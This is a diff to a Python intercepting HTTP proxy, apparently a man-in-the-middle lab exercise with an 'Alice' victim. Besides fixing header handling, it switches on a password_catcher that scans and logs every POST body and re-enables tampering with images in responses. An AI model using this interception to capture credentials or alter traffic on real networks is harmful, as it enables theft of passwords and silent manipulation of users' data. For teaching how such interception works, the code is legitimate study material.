@@ -20,11 +20,11 @@ class Proxy_Server(BaseHTTPRequestHandler):
         #  checking for image
         content_type = ''
         content_encoding = ''
-        for key in headers:
-            if key.lower() == 'content-type':
-                content_type = headers[key]
-            if key.lower() == 'content-encoding':
-                content_encoding = headers[key]
+        for line in headers:
+            if (line.split(':', 1)[0]).lower() == 'content-type':
+                content_type = (line.split(':', 1)[1]).lower()
+            if (line.split(':', 1)[0]).lower() == 'content-encoding':
+                content_encoding = (line.split(':', 1)[1]).lower()
         if len(re.findall('image', content_type)) < 1:
             return headers, body
 
@@ -52,9 +52,13 @@ class Proxy_Server(BaseHTTPRequestHandler):
             return headers, body
         output_image = output_image_buffer.getvalue()
         output_image_buffer.close()
-        for key in headers:
-            if key.lower() == 'content-length':
-                headers[key] = len(output_image)
+
+        for line in headers:
+            if (line.split(':', 1)[0]).lower() == 'content-length':
+                #headers[key] = len(output_image)
+                headers.remove(line)
+                headers.append('content-length: ' + str(len(output_image)))
+                break
         return headers, output_image
 
 
@@ -83,7 +87,7 @@ class Proxy_Server(BaseHTTPRequestHandler):
         request_body = self.rfile.read(0 if _request_len is None else int(_request_len))
         request_headers = self.headers.dict  # as dictionary
 
-        if request_method == 'POST' and False:
+        if request_method == 'POST':
             interesting_val = self.password_catcher(request_body)
             if len(interesting_val) > 0:
                 log_info = self.path
@@ -118,26 +122,12 @@ class Proxy_Server(BaseHTTPRequestHandler):
                         if line.split(':', 1)[1].lower() == value.lower():
                             respone_headers.remove(line)
                     break
+
         remove_header('Transfer-Encoding', 'chunked')
         remove_header('Connection')
-        #for key in respone_headers:
-        #    if key.lower() == 'Transfer-Encoding'.lower() and respone_headers[key].lower == 'chunked':
-        #        #respone_headers.pop(key, None)
-        #        respone_headers.remove(key)
-        #        break
-        #for key in respone_headers:
-        #    if key.lower() == 'Connection'.lower():
-                #respone_headers.pop(key, None)
-        #        respone_headers.remove(key)
-        #        break
 
-        #respone_headers['Connection'] = 'close'
         respone_headers.append('connection: close')
-        #for key in respone_headers:
-        #    if key.lower() == 'Content-Length'.lower():
-        #        respone_headers.pop(key, None)
-        #        break
-        #respone_headers, respone_data = self.response_content_handler(respone_headers, respone_data)
+        respone_headers, respone_data = self.response_content_handler(respone_headers, respone_data)
 
         # replying to Alice
         self.send_response(resp.status)
